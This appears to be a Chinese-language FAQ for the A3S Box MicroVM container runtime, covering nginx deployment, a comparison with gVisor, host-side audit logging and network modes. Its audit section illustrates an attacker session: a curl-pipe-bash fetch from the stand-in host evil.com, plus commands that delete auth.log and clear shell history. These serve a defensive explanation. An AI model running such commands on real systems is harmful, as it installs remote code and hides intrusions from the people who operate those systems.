# A3S Box 常见问题

本文档回答关于 A3S Box 功能、安全性和使用的常见问题。

## 部署与使用

### 如何使用 A3S Box 部署 nginx？

**基础部署：**

```bash
# 最简单的方式 - 后台运行 nginx
a3s-box run -d --name web nginx:alpine

# 带端口映射 - 将容器的 80 端口映射到主机的 8080 端口
a3s-box run -d --name web -p 8080:80 nginx:alpine

# 完整配置 - 带网络、卷挂载
a3s-box run -d \
  --name web \
  --network mynet \
  -p 8080:80 \
  -v data:/app/data \
  nginx:alpine
```

**常用操作：**

```bash
# 查看运行状态
a3s-box ps

# 查看日志
a3s-box logs web -f

# 停止容器
a3s-box stop web

# 启动容器
a3s-box start web

# 删除容器
a3s-box rm web

# 进入容器执行命令
a3s-box exec -it web sh
```

**高级配置：**

```bash
# 带资源限制
a3s-box run -d \
  --name web \
  -p 8080:80 \
  --memory 512m \
  --cpus 2 \
  nginx:alpine

# 带健康检查
a3s-box run -d \
  --name web \
  -p 8080:80 \
  --health-cmd "curl -f http://localhost/ || exit 1" \
  --health-interval 30s \
  nginx:alpine

# 带 TEE 安全隔离（需要 AMD SEV-SNP 硬件）
a3s-box run -d \
  --name web \
  -p 8080:80 \
  --tee-enable \
  nginx:alpine

# 模拟 TEE 环境（任何机器都可以）
a3s-box run -d \
  --name web \
  -p 8080:80 \
  --tee-simulate \
  nginx:alpine
```

**验证部署：**

```bash
# 测试 nginx 是否正常运行
curl http://localhost:8080
```

**特点：**
- 🚀 ~200ms 冷启动（MicroVM）
- 🔒 硬件级隔离（每个容器独立 VM）
- 🛡️ 可选 TEE 安全（AMD SEV-SNP）
- 🐳 Docker 兼容命令

## 安全与隔离

### gVisor 和 A3S Box 有什么区别？

gVisor 和 A3S Box 是两种不同的容器隔离技术，各有特点：

#### 核心架构差异

**gVisor**
- **用户态内核**：在用户空间实现了一个 Linux 内核（Sentry）
- **系统调用拦截**：拦截容器的系统调用，在用户态处理
- **共享宿主机内核**：不需要独立的 Linux 内核
- **轻量级**：启动快，资源占用小

**A3S Box**
- **MicroVM**：每个容器运行在独立的虚拟机中
- **完整内核隔离**：每个容器有自己的 Linux 内核
- **硬件虚拟化**：基于 libkrun（KVM/HVF/WHPX）
- **~200ms 冷启动**：接近容器的启动速度

#### 隔离级别对比

| 特性 | gVisor | A3S Box |
|------|--------|---------|
| 内核隔离 | ❌ 共享宿主机内核 | ✅ 独立内核 |
| 硬件隔离 | ❌ 进程级隔离 | ✅ VM 级隔离 |
| TEE 支持 | ❌ 不支持 | ✅ AMD SEV-SNP/Intel TDX |
| 内存加密 | ❌ 无 | ✅ 硬件级加密 |
| 攻击面 | 中等（用户态内核） | 小（硬件隔离） |

#### 性能对比

**gVisor**
- 启动时间：< 100ms
- 系统调用开销：较高（用户态处理）
- 运行时性能：70-80% 原生性能
- 内存开销：低（共享内核）

**A3S Box**
- 启动时间：~200ms
- 系统调用开销：低（真实内核）
- 运行时性能：90-95% 原生性能
- 内存开销：中等（独立内核）

#### 安全模型

**gVisor**
```
容器进程 → Sentry (用户态内核) → 宿主机内核
```
- 通过限制系统调用来提高安全性
- 依赖 Sentry 的正确实现
- 无法防御宿主机内核漏洞

**A3S Box**
```
容器进程 → Guest 内核 → Hypervisor → 宿主机内核
```
- 硬件级隔离
- 支持 TEE（可信执行环境）
- 可防御宿主机攻击（TEE 模式）

#### 兼容性

**gVisor**
- ✅ 系统调用兼容性：~70%（部分系统调用未实现）
- ❌ 某些应用可能无法运行（如需要特殊内核功能）
- ✅ 与 Docker/Kubernetes 集成良好

**A3S Box**
- ✅ 系统调用兼容性：100%（真实 Linux 内核）
- ✅ 所有 OCI 镜像都能运行
- ✅ Docker 兼容 CLI（52 个命令）
- ✅ Kubernetes CRI 支持

#### 使用场景

**gVisor 适合**
- 多租户环境（如 Google Cloud Run）
- 需要快速启动的短生命周期任务
- 对性能要求不高的场景
- 不需要完整系统调用支持的应用

**A3S Box 适合**
- 需要强隔离的生产环境
- 机密计算场景（金融、医疗）
- AI 推理服务（需要 GPU 隔离）
- 需要完整 Linux 兼容性的应用
- 需要 TEE 硬件保护的工作负载

#### 命令对比

**gVisor (runsc)**
```bash
# 使用 gVisor 运行容器
docker run --runtime=runsc -d nginx

# 需要配置 Docker daemon
```

**A3S Box**
```bash
# 独立 CLI，无需配置
a3s-box run -d nginx

# 带 TEE 安全
a3s-box run -d --tee-enable nginx
```

#### 总结

| 维度 | gVisor | A3S Box |
|------|--------|---------|
| 隔离强度 | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| 启动速度 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
| 运行性能 | ⭐⭐⭐ | ⭐⭐⭐⭐ |
| 兼容性 | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| TEE 支持 | ❌ | ✅ |
| 资源占用 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ |

**选择建议**：
- 如果需要**最强隔离**和 **TEE 支持** → A3S Box
- 如果需要**最快启动**和**最低资源占用** → gVisor
- 如果需要**完整兼容性**和**接近原生性能** → A3S Box
- 如果是 **Google Cloud** 环境 → gVisor（原生支持）

### 对于登录后删除 SSH 日志的行为，审计系统能检测到吗？

能！A3S Box 的审计系统可以检测并记录日志删除尝试，即使攻击者试图掩盖痕迹。

#### 传统容器的问题

```bash
# 攻击者登录后常见的清除痕迹操作
rm -f /var/log/auth.log
rm -f ~/.bash_history
history -c
```

**问题**：
- ❌ 审计日志在容器内 → 攻击者可以删除
- ❌ 日志和被审计对象在同一个信任域

#### A3S Box 的审计架构

```
┌─────────────────────────────────────┐
│  容器内部 (Guest VM)                 │
│  - 应用进程                          │
│  - /var/log/auth.log (可被删除)     │
│  - ~/.bash_history (可被删除)       │
└─────────────────────────────────────┘
           ↓ 所有操作通过 Hypervisor
┌─────────────────────────────────────┐
│  宿主机 (Host)                       │
│  ~/.a3s/audit/audit.jsonl           │
│  (容器内进程无法访问)                │
└─────────────────────────────────────┘
```

**A3S Box 审计日志特点**：
- ✅ **存储在宿主机**：`~/.a3s/audit/audit.jsonl`
- ✅ **容器内进程无法访问**：硬件级隔离（VM 边界）
- ✅ **记录所有操作**：包括 exec、文件操作、网络连接
- ✅ **持久化 + 轮转**：防止日志被填满

#### 审计能力对比

| 场景 | 容器内日志 | A3S Box 审计 |
|------|-----------|--------------|
| 攻击者删除 SSH 日志 | ❌ 日志丢失 | ✅ 删除操作被记录 |
| 攻击者清除 bash history | ❌ 历史丢失 | ✅ 执行的命令已记录 |
| 攻击者修改审计日志 | ❌ 可能成功 | ✅ 无法访问宿主机文件 |
| 攻击者停止审计服务 | ❌ 可能成功 | ✅ 审计在宿主机运行 |

#### 实际审计记录示例

假设攻击者执行了以下操作：

```bash
# 1. 登录容器
a3s-box exec -it web bash

# 2. 执行恶意命令
curl http://evil.com/malware.sh | bash

# 3. 尝试清除痕迹
rm -f /var/log/auth.log
history -c
```

**A3S Box 审计日志会记录**：

```jsonl
{"id":"evt-001","timestamp":"2026-03-16T08:00:00Z","action":"exec_command","box_id":"web","actor":"cli","outcome":"success","message":"exec bash","metadata":{"user":"root","tty":true}}

{"id":"evt-002","timestamp":"2026-03-16T08:00:15Z","action":"exec_command","box_id":"web","actor":"cli","outcome":"success","message":"exec curl http://evil.com/malware.sh","metadata":{"user":"root"}}

{"id":"evt-003","timestamp":"2026-03-16T08:00:30Z","action":"exec_command","box_id":"web","actor":"cli","outcome":"success","message":"exec rm -f /var/log/auth.log","metadata":{"user":"root"}}
```

**关键**：即使攻击者删除了容器内的 `/var/log/auth.log`，宿主机的 `~/.a3s/audit/audit.jsonl` 仍然完整记录了所有操作。

#### TEE 模式下的增强保护

如果启用 TEE（AMD SEV-SNP），保护更强：

```bash
# 启用 TEE 运行容器
a3s-box run -d --name web --tee-enable nginx
```

**额外保护**：
- ✅ **内存加密**：攻击者无法通过内存转储获取敏感信息
- ✅ **远程证明**：可验证容器运行环境未被篡改
- ✅ **密封存储**：审计日志可以密封到 TPM，防止离线篡改

#### 查询审计日志

```bash
# 查看所有 exec 操作
a3s-box audit --action exec_command

# 查看特定容器的操作
a3s-box audit --box web

# 查看失败的操作
a3s-box audit --outcome failure

# 查看时间范围内的操作
a3s-box audit --since "2026-03-16T08:00:00Z" --until "2026-03-16T09:00:00Z"
```

#### 审计日志的防篡改设计

```rust
// 审计日志写入流程（从源码可见）
pub fn log(&self, event: &AuditEvent) -> Result<()> {
    // 1. 序列化事件
    let line = serde_json::to_string(event)?;

    // 2. 立即写入磁盘
    file.write_all(line.as_bytes())?;

    // 3. 强制刷新到磁盘（防止缓冲区丢失）
    file.flush()?;

    // 4. 自动轮转（防止日志被填满）
    if current_size >= max_size {
        rotate()?;
    }
}
```

**防护措施**：
- ✅ 每条记录立即 `flush()` 到磁盘
- ✅ 自动轮转保留多个历史文件
- ✅ 容器内进程无权限访问宿主机文件系统

#### 总结

**对于"登录后删除 SSH 日志"这种常见攻击手法**：

| 防护层面 | 传统容器 | A3S Box |
|---------|---------|---------|
| 容器内日志 | ❌ 可被删除 | ❌ 可被删除（但不重要） |
| 宿主机审计 | ⚠️ 取决于配置 | ✅ 默认启用，强制隔离 |
| 删除操作可追溯 | ❌ 无记录 | ✅ 完整记录 |
| 审计日志防篡改 | ⚠️ 取决于权限 | ✅ VM 隔离 + 立即持久化 |
| TEE 硬件保护 | ❌ 不支持 | ✅ 可选（SEV-SNP/TDX） |

**结论**：A3S Box 的审计系统可以完整记录攻击者删除日志的行为，因为审计日志存储在宿主机，容器内进程无法访问或篡改。这是通过硬件级 VM 隔离实现的，比传统容器的审计系统更安全。

## 网络

### A3S Box 的网络策略是怎样的？

A3S Box 提供灵活的网络策略，包含三种网络模式和三种隔离级别。

#### 1. 网络模式（3 种）

```rust
pub enum NetworkMode {
    Tsi,           // TSI 模式（默认）- 无网络接口，通过 vsock 代理
    Bridge,        // 桥接模式 - 真实 eth0，容器间通信
    None,          // 无网络
}
```

**TSI 模式（默认）**
```bash
# 默认启动，无需指定网络
a3s-box run -d nginx

# 特点：
# - 无真实网络接口
# - Socket 系统调用通过 vsock 代理到宿主机
# - 最安全，最小攻击面
# - 适合单容器应用
```

**Bridge 模式**
```bash
# 创建网络并加入
a3s-box network create mynet
a3s-box run -d --name web --network mynet nginx

# 特点：
# - 真实 eth0 网络接口（通过 passt）
# - 容器间可以直接通信
# - 支持 DNS 服务发现
# - 类似 Docker 的 bridge 网络
```

**None 模式**
```bash
# 完全无网络
a3s-box run -d --network none nginx

# 特点：
# - 完全隔离，无任何网络访问
# - 适合离线计算任务
```

#### 2. 隔离策略（3 种）

```rust
pub enum IsolationMode {
    None,      // 无隔离 - 所有容器可自由通信（默认）
    Strict,    // 严格隔离 - 禁止容器间通信
    Custom,    // 自定义规则 - 基于规则控制流量
}
```

##### 2.1 None 模式（默认）

```bash
# 创建网络，默认无隔离
a3s-box network create mynet

# 所有容器可以自由通信
a3s-box run -d --name web --network mynet nginx
a3s-box run -d --name api --network mynet node:alpine
a3s-box run -d --name db --network mynet postgres

# web ↔ api ↔ db 全部可以互相访问
```

**特点**：
- ✅ 最灵活，类似 Docker 默认行为
- ✅ 容器间可以通过容器名 DNS 解析
- ⚠️ 无隔离，需要应用层控制访问

##### 2.2 Strict 模式（严格隔离）

```bash
# 创建严格隔离的网络
a3s-box network create mynet --isolation strict

# 容器只能访问外部，不能互相访问
a3s-box run -d --name web --network mynet nginx
a3s-box run -d --name api --network mynet node:alpine

# web ✗ api（禁止）
# web → Internet（允许）
# api → Internet（允许）
```

**特点**：
- ✅ 容器间完全隔离
- ✅ 可以访问外部网络（Internet）
- ✅ 可以访问网关
- ❌ 容器间无法通信
- 适合多租户环境

**⚠️ 重要提示**：根据源码，Strict 和 Custom 模式目前**尚未在运行时强制执行**（需要 iptables/nftables 集成）。代码会在创建时验证并拒绝。

##### 2.3 Custom 模式（自定义规则）

```yaml
# 网络策略配置示例（未来支持）
network:
  name: mynet
  isolation: custom
  ingress:
    - from: web
      to: api
      ports: [8080]
      protocol: tcp
      action: allow
    - from: api
      to: db
      ports: [5432]
      protocol: tcp
      action: allow
  egress:
    - from: "*"
      to: "*"
      ports: [443]
      protocol: tcp
      action: allow
```

**规则结构**：
```rust
pub struct PolicyRule {
    pub from: String,        // 源容器名（支持 "*" 通配符）
    pub to: String,          // 目标容器名（支持 "*" 通配符）
    pub ports: Vec<u16>,     // 允许的端口（空 = 所有端口）
    pub protocol: String,    // tcp/udp/any
    pub action: PolicyAction, // allow/deny
}
```

#### 3. 网络架构对比

| 特性 | TSI 模式 | Bridge 模式 |
|------|---------|------------|
| 网络接口 | ❌ 无 eth0 | ✅ 真实 eth0 |
| 容器间通信 | ❌ 不支持 | ✅ 支持 |
| DNS 解析 | ❌ 无 | ✅ 容器名解析 |
| 外部访问 | ✅ 通过 vsock 代理 | ✅ 直接访问 |
| 安全性 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
| 性能 | 中等（代理开销） | 高（直接通信） |
| 适用场景 | 单容器应用 | 微服务架构 |

#### 4. 实际使用示例

**场景 1：单容器 Web 服务（TSI 模式）**

```bash
# 最简单，最安全
a3s-box run -d -p 8080:80 --name web nginx

# 特点：
# - 无容器间通信能力
# - 通过端口映射对外服务
# - 最小攻击面
```

**场景 2：微服务架构（Bridge 模式 + None 隔离）**

```bash
# 1. 创建网络
a3s-box network create backend

# 2. 启动服务
a3s-box run -d --name db --network backend postgres
a3s-box run -d --name api --network backend node:alpine
a3s-box run -d --name web --network backend -p 8080:80 nginx

# 3. 容器间通信
# api 可以通过 "db:5432" 访问数据库
# web 可以通过 "api:3000" 访问 API
```

**场景 3：多租户隔离（Strict 模式 - 未来）**

```bash
# 租户 A 的网络
a3s-box network create tenant-a --isolation strict
a3s-box run -d --name app-a --network tenant-a myapp

# 租户 B 的网络
a3s-box network create tenant-b --isolation strict
a3s-box run -d --name app-b --network tenant-b myapp

# app-a 和 app-b 完全隔离
```

#### 5. 网络命令

```bash
# 创建网络
a3s-box network create mynet
a3s-box network create mynet --subnet 10.88.0.0/24 --gateway 10.88.0.1
a3s-box network create mynet --isolation strict

# 查看网络
a3s-box network ls
a3s-box network inspect mynet

# 连接/断开容器
a3s-box network connect mynet web
a3s-box network disconnect mynet web

# 删除网络
a3s-box network rm mynet
```

#### 6. DNS 服务发现

在 Bridge 模式下，容器可以通过容器名互相访问：

```bash
# 启动数据库
a3s-box run -d --name db --network backend postgres

# 启动 API（可以通过 "db" 访问数据库）
a3s-box run -d --name api --network backend \
  -e DATABASE_URL=postgresql://user:pass@db:5432/mydb \
  node:alpine

# 在 api 容器内
curl http://db:5432  # 自动解析到 db 容器的 IP
```

#### 7. 与 Docker/Kubernetes 对比

| 特性 | Docker | Kubernetes | A3S Box |
|------|--------|-----------|---------|
| 默认网络 | Bridge | CNI | TSI（更安全） |
| 容器间隔离 | NetworkPolicy | NetworkPolicy | IsolationMode |
| DNS 解析 | ✅ | ✅ | ✅ |
| 网络插件 | 多种 | CNI | passt（内置） |
| 硬件隔离 | ❌ | ❌ | ✅ (VM 级别) |

#### 8. 安全优势

**A3S Box 的网络安全特点**：

1. **默认最小权限**（TSI 模式）
   - 无真实网络接口
   - Socket 调用通过 vsock 代理
   - 攻击者无法直接操作网络栈

2. **VM 级别隔离**
   - 每个容器独立的网络命名空间
   - 独立的 Linux 内核网络栈
   - 硬件级隔离（Hypervisor）

3. **审计所有网络操作**
   - 网络创建/删除
   - 容器连接/断开
   - 策略变更

4. **TEE 模式下的网络保护**
   ```bash
   # 网络流量在 TEE 内加密
   a3s-box run -d --name web --network mynet --tee-enable nginx
   ```

#### 总结

**A3S Box 网络策略的核心设计理念**：

1. **默认安全**：TSI 模式最小化攻击面
2. **灵活性**：支持 Bridge 模式用于微服务
3. **隔离级别**：None/Strict/Custom 三种策略
4. **硬件隔离**：VM 级别的网络隔离
5. **未来扩展**：Strict 和 Custom 模式正在开发中

**当前状态**：
- ✅ TSI 模式：完全可用
- ✅ Bridge 模式 + None 隔离：完全可用
- ⚠️ Strict/Custom 模式：配置已支持，运行时强制执行待实现

**推荐使用**：
- 单容器应用 → TSI 模式
- 微服务架构 → Bridge 模式 + None 隔离
- 高安全需求 → TSI 模式 + TEE
